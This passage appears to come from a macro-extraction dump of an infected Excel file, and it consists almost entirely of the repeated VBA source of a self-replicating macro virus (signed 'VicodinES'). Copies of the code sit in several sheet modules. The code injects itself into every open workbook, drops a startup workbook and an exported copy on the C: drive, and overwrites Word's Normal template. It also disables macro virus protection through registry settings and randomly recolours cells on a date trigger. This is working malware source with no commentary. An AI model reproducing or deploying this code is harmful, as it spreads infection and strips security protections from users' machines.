Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then
If Weins1 <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
If Len(VCode) > 3000 Then GoTo out
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then PXLS = True
If PXLS = False And run1 <> True Then
run1 = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & v1 & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 100 Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public run1, didvic As Boolean" & v1 & "Private Sub Worksheet_Activate()" & v1 & VCode)
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.DeleteLines Weins1, 1
End If
End If
If Workbooks(x).VBProject.VBComponents.Item(yy).Type = 1 Then
findvic = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.Lines((Weins1), 24)
If InStr(1, findvic, "VicodinES") <> 2 And didvic <> True Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.InsertLines (Weins1 + 1), "Private Sub Auto_Close()" & v1 & "For x = 1 To Workbooks.Count" & v1 & "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count" & v1 & "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines" & v1 & "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then" & v1 & "If Weins1 > 30 Then OKEY = True" & v1 & "End If" & v1 & "Next yz" & v1 & "Next x" & v1 & "If OKEY <> True Then" & v1 & "If UCase(Dir(""c:\"" & Application.UserName)) = UCase(Application.UserName) Then" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.AddFromFile ""c:\"" & Application.UserName" & v1 & "Workbooks(Workbooks.Count).VBProject.VBComponents.Item(""ThisWorkbook"").CodeModule.DeleteLines 1, 4" & v1 & "Else" & v1 & "MsgBox ""Why Did You Remove Sugar.Poppy?"", vbQuestion, ""VicodinES wonders...""" & v1 & "End If" & v1 & "End If" & v1 & "End Sub" & v1 & "'VicodinES"
didvic = True
Else
didvic = True
End If
End If
Next yy
Next x
If PXLS = False Then
Call AbuseWord
Workbooks("Book1.").Close SaveChanges:=True
End If
End Sub
Private Sub AbuseWord()
On Error Resume Next
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
Quit = True
End If
Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If InStr(1, NT.Lines(1, 1), "'Vic") Then
WordObj.Run "Normal.ThisDocument.AutoExec"
Else
WordObj.Options.SaveNormalPrompt = False
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, "Sub AutoExec() 'Vic"
NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Interior.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public run1, didvic As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For y = 1 To 10: For x = 1 To 30
rng = Chr(64 + y) & x
Range(rng).Select
With Selection.Interior
.ColorIndex = (Int(Rnd * 50))
.Pattern = xlSolid
End With
Next x: Next y
End If
If UCase(Dir("c:\" & Application.UserName)) <> UCase(Application.UserName) Then
ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkbook").Export "c:\" & Application.UserName
End If
v1 = vbCr
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
If Len(VCode) > 3000 Then GoTo out
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
